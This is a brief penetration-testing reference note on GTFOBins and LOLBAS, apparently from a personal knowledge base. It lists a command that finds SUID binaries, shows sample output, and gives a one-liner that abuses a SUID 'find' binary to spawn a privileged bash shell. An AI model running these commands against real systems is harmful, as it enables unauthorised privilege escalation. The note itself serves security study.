# 💢 gtfobins lolbas

Tags: #💢 
Related to: 
See also: 
Previous: [[Post Exploitation]]

## Description

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

## Usage Examples

### Exploit find misconfiguration

Find SUID files:

	find / -perm -4000 -ls 2>/dev/null

```
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/find
```

Exploit find SUID misconfigurationt: [^1]

	find . -exec /bin/bash -p \; -quit	// bash-5.0#

# References

[^1]: https://gtfobins.github.io/

https://lolbas-project.github.io/# // Windows